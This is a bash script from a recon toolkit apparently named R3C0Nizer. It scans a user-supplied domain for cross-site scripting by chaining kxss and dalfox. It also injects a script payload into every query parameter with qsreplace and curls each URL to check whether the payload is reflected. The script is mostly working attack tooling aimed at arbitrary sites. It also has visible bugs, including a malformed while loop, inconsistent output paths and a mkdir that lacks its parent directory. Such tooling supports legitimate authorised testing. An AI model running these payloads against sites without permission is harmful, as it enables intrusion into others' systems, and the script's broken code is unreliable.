#!/bin/bash

#colors
red=`tput setaf 1`
green=`tput setaf 2`
yellow=`tput setaf 3`
blue=`tput setaf 4`
magenta=`tput setaf 5`
reset=`tput sgr0`

read -p "Enter domain name : " DOM

if [ -d ~/reconizer/ ]
then
  echo " "
else
  mkdir ~/reconizer
fi

if [ -d ~/reconizer/$DOM/xss_scan/]
then
  echo " "
else
  mkdir ~/reconizer/$DOM/xss_scan
fi


echo "${red}
 =================================================
|   ____  _____  ____ ___  _   _ _                |
|  |  _ \|___ / / ___/ _ \| \ | (_)_______ _ __   |
|  | |_) | |_ \| |  | | | |  \| | |_  / _ \ '__|  |
|  |  _ < ___) | |__| |_| | |\  | |/ /  __/ |     |
|  |_| \_\____/ \____\___/|_| \_|_/___\___|_|     |
|                                                 |
 ================== Anon-Artist ==================
${reset}"
echo "${blue} [+] Started xss Vulnerability Scanning ${reset}"
echo " "

#xss
echo "${yellow} ---------------------------------- xxxxxxxx ---------------------------------- ${reset}"
echo " "
if [ -f ~/go/bin/kxss ]
then
  echo "${magenta} [+] Running kxss ${reset}"
cat ~/reconizer/$DOM/GF_Patterns/xss.txt | kxss  | tee $DOM/xss_scan/kxss.txt
cat ~/reconizer/$DOM/xss_scan/kxss.txt | awk '{print $9}' | sed 's/=.*/=/' | tee ~/reconizer/$DOM/xss_scan/kxss1.txt
cat ~/reconizer/$DOM/xss_scan/kxss1.txt | dalfox pipe | tee ~/reconizer/$DOM/xss_scan/dalfoxss.txt
cat ~/reconizer/$DOM/gf/xss.txt | grep "=" | qsreplace "'><sCriPt class=khan>prompt(1)</script>" | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "'><sCriPt class=khan>prompt(1)" && echo "$host \033[0;31mVulnerable\n";done | tee ~/reconizer/$DOM/xss_scan/vulnxss.txt
else
  echo "${blue} [+] Installing xss ${reset}"
   go get -u github.com/tomnomnom/hacks/kxss
  echo "${magenta} [+] Running xss ${reset}"

fi

if [ -f ~/go/bin/dalfox ]
then
  echo "${magenta} [+] Running dalfox ${reset}"

else
  echo "${blue} [+] Installing xss ${reset}"
  go get -v github.com/hahwul/dalfox/v2
  echo "${magenta} [+] Running xss ${reset}"

fi

echo "${yellow} ---------------------------------- xxxxxxxx ---------------------------------- ${reset}"
echo ""
echo "${blue} [+] Successfully saved the results"
echo ""
echo "${yellow} ---------------------------------- xxxxxxxx ---------------------------------- ${reset}"
echo " "
echo "${red} [+] Thank you for using R3C0Nizer${reset}"
echo ""
echo "${yellow} ---------------------------------- xxxxxxxx ---------------------------------- ${reset}"
